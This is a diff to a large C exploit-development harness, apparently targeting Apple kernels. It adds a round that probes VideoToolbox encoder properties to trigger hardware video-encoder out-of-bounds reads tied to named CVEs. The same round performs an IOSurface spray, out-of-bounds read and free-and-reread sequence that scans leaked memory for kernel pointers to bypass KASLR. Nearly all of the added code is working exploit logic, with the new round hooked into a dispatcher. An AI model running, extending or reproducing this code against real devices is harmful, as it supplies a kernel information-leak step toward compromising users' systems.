@@ -24885,6 +24885,415 @@ part2:
     fflush(stdout);
 }
 
+/* ============================================================
+ * r492: AVE OOB read trigger hunt + SurfHeist kptr leak
+ *
+ * Two parallel paths:
+ * 1. Probe VTSession properties and encoder configs that
+ *    might trigger CVE-2026-112466/112465 (AVE OOB reads)
+ * 2. SurfHeist-style OOB read between adjacent IOSurfaces,
+ *    examining leaked data for kernel pointers (KASLR bypass)
+ * ============================================================ */
+
+static int r492_cbs = 0;
+static size_t r492_data_len = 0;
+static uint8_t r492_data[65536];
+static void r492_enc_cb(void *ref, void *src, OSStatus st,
+                        VTEncodeInfoFlags fl, CMSampleBufferRef sb) {
+    r492_cbs++;
+    if (!sb) return;
+    CMBlockBufferRef blk = CMSampleBufferGetDataBuffer(sb);
+    if (blk) {
+        size_t total = CMBlockBufferGetDataLength(blk);
+        if (total > 0 && total <= 65536) {
+            CMBlockBufferCopyDataBytes(blk, 0, total, r492_data);
+            r492_data_len = total;
+        }
+    }
+}
+
+static void r492_exploit(void) {
+    rlog("\n=== r492: AVE OOB read hunt + SurfHeist kptr leak ===\n\n");
+    fflush(stdout);
+
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+
+    /* Part 1: Probe VT encoder configurations for OOB read trigger.
+     * The AVE OOB read CVEs involve unchecked indices in configInfo.
+     * We try various unusual property values and check if any cause
+     * the encoder to return unexpected data. */
+    rlog("--- Part 1: VT encoder config probing ---\n");
+    {
+        /* Try H.264 encoder (might have different callback behavior) */
+        rlog("  H.264 encoder test:\n");
+        {
+            CFMutableDictionaryRef sa = CFDictionaryCreateMutable(
+                kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
+                &kCFTypeDictionaryValueCallBacks);
+            CFDictionaryRef iop = CFDictionaryCreate(kCFAllocatorDefault,
+                NULL, NULL, 0, &kCFTypeDictionaryKeyCallBacks,
+                &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(sa, kCVPixelBufferIOSurfacePropertiesKey, iop);
+            CFRelease(iop);
+            int pf = kCVPixelFormatType_32BGRA;
+            CFNumberRef fn = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &pf);
+            CFDictionarySetValue(sa, kCVPixelBufferPixelFormatTypeKey, fn);
+            CFRelease(fn);
+
+            VTCompressionSessionRef enc = NULL;
+            OSStatus st = VTCompressionSessionCreate(kCFAllocatorDefault, 128, 128,
+                kCMVideoCodecType_H264, NULL, sa, NULL, r492_enc_cb, NULL, &enc);
+            CFRelease(sa);
+            rlog("  H264 create: st=%d enc=%p\n", (int)st, enc);
+
+            if (enc) {
+                VTSessionSetProperty(enc, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
+                VTSessionSetProperty(enc, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
+
+                /* Try setting NTL on H.264 */
+                int ntl = 4;
+                CFNumberRef n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &ntl);
+                OSStatus ps = VTSessionSetProperty(enc, CFSTR("NumberOfTemporalLayers"), n);
+                CFRelease(n);
+                rlog("  H264 NTL=4 set: st=%d\n", (int)ps);
+
+                VTCompressionSessionPrepareToEncodeFrames(enc);
+                CVPixelBufferPoolRef pool = VTCompressionSessionGetPixelBufferPool(enc);
+
+                r492_cbs = 0; r492_data_len = 0;
+                CVPixelBufferRef pb = NULL;
+                CVPixelBufferPoolCreatePixelBuffer(kCFAllocatorDefault, pool, &pb);
+                if (pb) {
+                    CVPixelBufferLockBaseAddress(pb, 0);
+                    memset(CVPixelBufferGetBaseAddress(pb), 0x80,
+                           CVPixelBufferGetBytesPerRow(pb) * CVPixelBufferGetHeight(pb));
+                    CVPixelBufferUnlockBaseAddress(pb, 0);
+                    VTCompressionSessionEncodeFrame(enc, pb, CMTimeMake(0, 30),
+                        kCMTimeInvalid, NULL, NULL, NULL);
+                    CVPixelBufferRelease(pb);
+                }
+                VTCompressionSessionCompleteFrames(enc, kCMTimePositiveInfinity);
+                rlog("  H264: cbs=%d data=%zu\n", r492_cbs, r492_data_len);
+                if (r492_data_len > 0) {
+                    rlog("  H264 output hex:");
+                    for (size_t i = 0; i < r492_data_len && i < 64; i++)
+                        rlog(" %02x", r492_data[i]);
+                    rlog("\n");
+                }
+
+                /* Try large NTL on H.264 to see if it also has the OOB */
+                ntl = 1000;
+                n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &ntl);
+                ps = VTSessionSetProperty(enc, CFSTR("NumberOfTemporalLayers"), n);
+                CFRelease(n);
+                rlog("  H264 NTL=1000 set: st=%d\n", (int)ps);
+
+                r492_cbs = 0; r492_data_len = 0;
+                pb = NULL;
+                CVPixelBufferPoolCreatePixelBuffer(kCFAllocatorDefault, pool, &pb);
+                if (pb) {
+                    CVPixelBufferLockBaseAddress(pb, 0);
+                    memset(CVPixelBufferGetBaseAddress(pb), 0x80,
+                           CVPixelBufferGetBytesPerRow(pb) * CVPixelBufferGetHeight(pb));
+                    CVPixelBufferUnlockBaseAddress(pb, 0);
+                    VTCompressionSessionEncodeFrame(enc, pb, CMTimeMake(1, 30),
+                        kCMTimeInvalid, NULL, NULL, NULL);
+                    CVPixelBufferRelease(pb);
+                }
+                VTCompressionSessionCompleteFrames(enc, kCMTimePositiveInfinity);
+                rlog("  H264 NTL=1000: cbs=%d data=%zu\n", r492_cbs, r492_data_len);
+                if (r492_data_len > 0) {
+                    rlog("  H264 NTL=1000 output hex:");
+                    for (size_t i = 0; i < r492_data_len && i < 64; i++)
+                        rlog(" %02x", r492_data[i]);
+                    rlog("\n");
+                }
+
+                VTCompressionSessionInvalidate(enc);
+                CFRelease(enc);
+            }
+        }
+
+        /* Try unusual encoder properties that might trigger OOB reads */
+        rlog("\n  Probing unusual VT properties:\n");
+        {
+            CFMutableDictionaryRef sa = CFDictionaryCreateMutable(
+                kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
+                &kCFTypeDictionaryValueCallBacks);
+            CFDictionaryRef iop = CFDictionaryCreate(kCFAllocatorDefault,
+                NULL, NULL, 0, &kCFTypeDictionaryKeyCallBacks,
+                &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(sa, kCVPixelBufferIOSurfacePropertiesKey, iop);
+            CFRelease(iop);
+            int pf = kCVPixelFormatType_32BGRA;
+            CFNumberRef fn = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &pf);
+            CFDictionarySetValue(sa, kCVPixelBufferPixelFormatTypeKey, fn);
+            CFRelease(fn);
+
+            VTCompressionSessionRef enc = NULL;
+            VTCompressionSessionCreate(kCFAllocatorDefault, 128, 128,
+                kCMVideoCodecType_HEVC, NULL, sa, NULL, r492_enc_cb, NULL, &enc);
+            CFRelease(sa);
+
+            if (enc) {
+                /* Try reading SupportedProfiles */
+                CFStringRef props_to_read[] = {
+                    CFSTR("SupportedProfiles"),
+                    CFSTR("SupportedProfileLevels"),
+                    CFSTR("HardwareAcceleratorTaskPriority"),
+                    CFSTR("UsingHardwareAcceleratedVideoEncoder"),
+                    CFSTR("EncoderID"),
+                    CFSTR("RequiredEncoderGPURegistryID"),
+                    CFSTR("EnableHardwareAcceleratedVideoEncoder"),
+                    CFSTR("Priority"),
+                    CFSTR("SupportsFrameDelay"),
+                    CFSTR("MaxH264SliceBytes"),
+                    CFSTR("MaximumRealTimeFrameRate"),
+                    CFSTR("MaximumFrameDelayCount"),
+                    CFSTR("SupportsBaseFrameQP"),
+                    CFSTR("PrioritizeEncodingSpeedOverQuality"),
+                    CFSTR("EnableLowLatencyRateControl"),
+                    CFSTR("BaseLayerBitRateFraction"),
+                    CFSTR("BaseLayerFrameRateFraction"),
+                    CFSTR("MoreFramesBeforeStart"),
+                    CFSTR("MoreFramesAfterEnd"),
+                    CFSTR("SourceFrameCount"),
+                };
+                int nprops = sizeof(props_to_read) / sizeof(props_to_read[0]);
+
+                for (int i = 0; i < nprops; i++) {
+                    CFTypeRef val = NULL;
+                    OSStatus ps = VTSessionCopyProperty(enc, props_to_read[i],
+                        kCFAllocatorDefault, &val);
+                    const char *pname = CFStringGetCStringPtr(props_to_read[i],
+                        kCFStringEncodingUTF8);
+                    if (ps == noErr && val) {
+                        CFTypeID tid = CFGetTypeID(val);
+                        if (tid == CFNumberGetTypeID()) {
+                            int64_t nv = 0;
+                            CFNumberGetValue(val, kCFNumberSInt64Type, &nv);
+                            rlog("    %s = %lld\n", pname ?: "?", (long long)nv);
+                        } else if (tid == CFBooleanGetTypeID()) {
+                            rlog("    %s = %s\n", pname ?: "?",
+                                 CFBooleanGetValue(val) ? "true" : "false");
+                        } else if (tid == CFStringGetTypeID()) {
+                            char buf[256];
+                            CFStringGetCString(val, buf, 256, kCFStringEncodingUTF8);
+                            rlog("    %s = \"%s\"\n", pname ?: "?", buf);
+                        } else if (tid == CFArrayGetTypeID()) {
+                            CFIndex cnt = CFArrayGetCount(val);
+                            rlog("    %s = array[%ld]\n", pname ?: "?", (long)cnt);
+                            /* Dump first few elements */
+                            for (CFIndex j = 0; j < cnt && j < 10; j++) {
+                                CFTypeRef elem = CFArrayGetValueAtIndex(val, j);
+                                if (CFGetTypeID(elem) == CFNumberGetTypeID()) {
+                                    int64_t ev = 0;
+                                    CFNumberGetValue(elem, kCFNumberSInt64Type, &ev);
+                                    rlog("      [%ld] = %lld\n", (long)j, (long long)ev);
+                                } else if (CFGetTypeID(elem) == CFDictionaryGetTypeID()) {
+                                    rlog("      [%ld] = dict(%ld keys)\n", (long)j,
+                                         (long)CFDictionaryGetCount(elem));
+                                }
+                            }
+                        } else if (tid == CFDataGetTypeID()) {
+                            CFIndex dlen = CFDataGetLength(val);
+                            rlog("    %s = data[%ld]:", pname ?: "?", (long)dlen);
+                            const UInt8 *d = CFDataGetBytePtr(val);
+                            for (CFIndex j = 0; j < dlen && j < 64; j++)
+                                rlog(" %02x", d[j]);
+                            rlog("\n");
+                            /* Check for kernel pointers in data */
+                            for (CFIndex j = 0; j + 7 < dlen; j += 8) {
+                                uint64_t v;
+                                memcpy(&v, d + j, 8);
+                                if ((v >> 36) == 0xfffffff) {
+                                    rlog("    *** KPTR at off %ld: 0x%llx ***\n",
+                                         (long)j, (unsigned long long)v);
+                                }
+                            }
+                        } else {
+                            rlog("    %s = <%s>\n", pname ?: "?", "other");
+                        }
+                        CFRelease(val);
+                    } else {
+                        rlog("    %s = err %d\n", pname ?: "?", (int)ps);
+                    }
+                }
+
+                VTCompressionSessionInvalidate(enc);
+                CFRelease(enc);
+            }
+        }
+    }
+
+    /* Part 2: SurfHeist OOB read for kernel pointer leak.
+     * Create many IOSurfaces, find adjacent pairs, read past
+     * the boundary to find zone metadata or kernel pointers. */
+    rlog("\n--- Part 2: SurfHeist kptr leak ---\n");
+    {
+        #define R492_NSURF 100
+        #define R492_SURF_SZ (16384 * 4) /* 64KB - 4 pages */
+        IOSurfaceRef surfs[R492_NSURF] = {0};
+        uint32_t surfids[R492_NSURF] = {0};
+        int created = 0;
+
+        /* Create IOSurfaces */
+        for (int i = 0; i < R492_NSURF; i++) {
+            CFMutableDictionaryRef sp = CFDictionaryCreateMutable(
+                kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
+                &kCFTypeDictionaryValueCallBacks);
+            int v1 = 1, vsz = R492_SURF_SZ, vpf = 0x20202038;
+            CFNumberRef n1 = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &v1);
+            CFNumberRef ns = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &vsz);
+            CFNumberRef np = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &vpf);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), n1);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), n1);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerElement"), n1);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), ns);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceAllocSize"), ns);
+            CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), np);
+            CFRelease(n1); CFRelease(ns); CFRelease(np);
+            IOSurfaceRef s = IOSurfaceCreate(sp);
+            CFRelease(sp);
+            if (s) {
+                surfs[i] = s;
+                surfids[i] = IOSurfaceGetID(s);
+                /* Fill with unique pattern */
+                IOSurfaceLock(s, 0, NULL);
+                uint32_t *d = (uint32_t *)IOSurfaceGetBaseAddress(s);
+                for (int j = 0; j < R492_SURF_SZ / 4; j++)
+                    d[j] = 0xAA000000 | (i << 16) | j;
+                IOSurfaceUnlock(s, 0, NULL);
+                created++;
+            }
+        }
+        rlog("  Created %d IOSurfaces (%d bytes each)\n", created, R492_SURF_SZ);
+
+        /* Look for adjacent IOSurface pairs by reading past boundary.
+         * IOSurface data is mapped contiguously in our process via
+         * IOSurfaceGetBaseAddress. If two surfaces are adjacent in
+         * physical memory, reading past one might show the other's data. */
+        int adjacent_found = 0;
+        int kptrs_found = 0;
+
+        for (int i = 0; i < created; i++) {
+            if (!surfs[i]) continue;
+            IOSurfaceLock(surfs[i], kIOSurfaceLockReadOnly, NULL);
+            uint8_t *base = (uint8_t *)IOSurfaceGetBaseAddress(surfs[i]);
+            size_t sz = IOSurfaceGetAllocSize(surfs[i]);
+
+            /* Read the last 64 bytes of this surface */
+            rlog("  Surf[%d] id=%u tail:", i, surfids[i]);
+            for (int j = 0; j < 16; j++)
+                rlog(" %02x", base[sz - 16 + j]);
+            rlog("\n");
+
+            /* Try to read 64 bytes PAST the end (OOB) */
+            /* Note: this is in userspace VM — if the page after isn't
+             * mapped, we'll get SIGBUS. Use mach_vm_read_overwrite
+             * to safely attempt the read. */
+            {
+                uint8_t oob[64] = {0};
+                vm_size_t oob_sz = 64;
+                kern_return_t kr = mach_vm_read_overwrite(
+                    mach_task_self(),
+                    (mach_vm_address_t)(base + sz),
+                    64, (mach_vm_address_t)oob, &oob_sz);
+                if (kr == KERN_SUCCESS) {
+                    /* Check if OOB data matches any other surface's pattern */
+                    uint32_t first_word;
+                    memcpy(&first_word, oob, 4);
+                    int src_surf = (first_word >> 16) & 0xFF;
+                    int is_pattern = (first_word & 0xFF000000) == 0xAA000000;
+
+                    if (is_pattern && src_surf >= 0 && src_surf < R492_NSURF) {
+                        adjacent_found++;
+                        rlog("  *** ADJACENT: surf[%d] -> surf[%d] ***\n", i, src_surf);
+                    } else {
+                        rlog("  OOB[%d] hex:", i);
+                        for (int j = 0; j < 64; j++) rlog(" %02x", oob[j]);
+                        rlog("\n");
+
+                        /* Check for kernel pointers */
+                        for (int j = 0; j + 7 < 64; j += 8) {
+                            uint64_t v;
+                            memcpy(&v, oob + j, 8);
+                            if ((v >> 36) == 0xfffffff ||
+                                (v >> 36) == 0xfffffffe) {
+                                kptrs_found++;
+                                rlog("  *** KPTR at surf[%d]+%zu+%d: 0x%llx ***\n",
+                                     i, sz, j, (unsigned long long)v);
+                            }
+                        }
+                    }
+                }
+            }
+
+            IOSurfaceUnlock(surfs[i], kIOSurfaceLockReadOnly, NULL);
+        }
+
+        rlog("  Adjacent pairs: %d, kptrs found: %d\n", adjacent_found, kptrs_found);
+
+        /* Free alternating surfaces and read the holes */
+        rlog("\n  Freeing alternating surfaces and reading holes...\n");
+        for (int i = 1; i < created; i += 2) {
+            CFRelease(surfs[i]);
+            surfs[i] = NULL;
+        }
+
+        /* Re-read OOB from surviving surfaces */
+        int post_free_kptrs = 0;
+        for (int i = 0; i < created; i += 2) {
+            if (!surfs[i]) continue;
+            IOSurfaceLock(surfs[i], kIOSurfaceLockReadOnly, NULL);
+            uint8_t *base = (uint8_t *)IOSurfaceGetBaseAddress(surfs[i]);
+            size_t sz = IOSurfaceGetAllocSize(surfs[i]);
+
+            uint8_t oob[256] = {0};
+            vm_size_t oob_sz = 256;
+            kern_return_t kr = mach_vm_read_overwrite(
+                mach_task_self(),
+                (mach_vm_address_t)(base + sz),
+                256, (mach_vm_address_t)oob, &oob_sz);
+            if (kr == KERN_SUCCESS) {
+                /* Check if data changed from the freed surface */
+                uint32_t first_word;
+                memcpy(&first_word, oob, 4);
+                int is_old_pattern = (first_word & 0xFF000000) == 0xAA000000;
+                int is_zero = (first_word == 0);
+
+                if (!is_old_pattern && !is_zero) {
+                    rlog("  Post-free OOB[%d] hex:", i);
+                    for (int j = 0; j < 128 && (size_t)j < oob_sz; j++)
+                        rlog(" %02x", oob[j]);
+                    rlog("\n");
+
+                    for (int j = 0; j + 7 < (int)oob_sz; j += 8) {
+                        uint64_t v;
+                        memcpy(&v, oob + j, 8);
+                        if ((v >> 36) == 0xfffffff ||
+                            (v >> 36) == 0xfffffffe) {
+                            post_free_kptrs++;
+                            rlog("  *** POST-FREE KPTR at surf[%d]+%zu+%d: 0x%llx ***\n",
+                                 i, sz, j, (unsigned long long)v);
+                        }
+                    }
+                }
+            }
+            IOSurfaceUnlock(surfs[i], kIOSurfaceLockReadOnly, NULL);
+        }
+        rlog("  Post-free kptrs: %d\n", post_free_kptrs);
+
+        /* Cleanup */
+        for (int i = 0; i < R492_NSURF; i++) {
+            if (surfs[i]) CFRelease(surfs[i]);
+        }
+    }
+
+    rlog("\n=== r492 complete ===\n");
+    fflush(stdout);
+}
+
 static void r471_exploit(void) {
     rlog("\n=== r471: 8-page IOSurface + large IOV TOCTOU ===\n\n");
     fflush(stdout);
@@ -94962,6 +95371,12 @@ new_modes:
             r484_exploit();
             goto done;
         }
+        if (rounds == 496) {
+            rlog("*** rounds=496: AVE OOB read hunt + SurfHeist kptr ***\n\n");
+            fflush(stdout);
+            r492_exploit();
+            goto done;
+        }
         if (rounds == 495) {
             rlog("*** rounds=495: IOSurface DMA + SurfHeist combo ***\n\n");
             fflush(stdout);
@@ -97941,7 +98356,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 495 && rounds != 494 && rounds != 493 && rounds != 492 && rounds != 491 && rounds != 490 && rounds != 489 && rounds != 488 && rounds != 487 && rounds != 486 && rounds != 485 && rounds != 484 && rounds != 483 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 475 && rounds != 496 && rounds != 495 && rounds != 494 && rounds != 493 && rounds != 492 && rounds != 491 && rounds != 490 && rounds != 489 && rounds != 488 && rounds != 487 && rounds != 486 && rounds != 485 && rounds != 484 && rounds != 483 && rounds != 482 && rounds != 481 && rounds != 480 && rounds != 479 && rounds != 478 && rounds != 477 && rounds != 476 && rounds != 475 && rounds != 474 && rounds != 473 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
